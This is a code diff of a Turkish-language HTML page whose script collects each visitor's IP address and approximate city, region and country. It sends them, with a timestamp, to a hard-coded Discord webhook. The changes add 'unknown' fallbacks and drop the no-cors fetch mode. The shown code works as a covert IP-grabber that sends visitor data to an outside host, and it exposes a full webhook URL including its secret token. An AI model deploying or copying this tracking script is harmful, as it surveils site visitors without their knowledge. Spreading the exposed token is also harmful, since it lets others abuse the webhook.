@@ -10,7 +10,7 @@
 <h1>Webhook Bilgi Gönderimi</h1>
 
 <script>
-    const webhookURL = "https://discord.com/api/webhooks/1296603491879354370/WXykNab0K8gAwaa0-zfn8oCGxXef4p76zYI9wsy2lX2Cz4xH0eJslwKAYeqoBGXWXEgf"; // Webhook URL'nizi buraya ekleyin
+    const webhookURL = "https://discord.com/api/webhooks/1296603491879354370/WXykNab0K8gAwaa0-zfn8oCGxXef4p76zYI9wsy2lX2Cz4xH0eJslwKAYeqoBGXWXEgf"; // Webhook URL
 
     // Türkiye saati (UTC+3) ile zaman almak
     function getTurkishTime() {
@@ -32,9 +32,9 @@
         })
         .then(data => {
             const ip = data.ip;
-            const city = data.city;
-            const region = data.region;
-            const country = data.country;
+            const city = data.city || "Bilinmiyor";
+            const region = data.region || "Bilinmiyor";
+            const country = data.country || "Bilinmiyor";
 
             // Discord Webhook'a Embed formatında mesaj gönderme
             const embedMessage = {
@@ -82,14 +82,13 @@
                 ]
             };
 
-            // Discord'a POST isteği yap (no-cors modunda)
+            // Discord'a POST isteği yap
             fetch(webhookURL, {
                 method: "POST",
                 headers: {
                     "Content-Type": "application/json"
                 },
-                body: JSON.stringify(embedMessage),
-                mode: 'no-cors'  // CORS sorunlarını aşmak için
+                body: JSON.stringify(embedMessage)
             })
             .then(() => {
                 console.log("Mesaj gönderildi.");
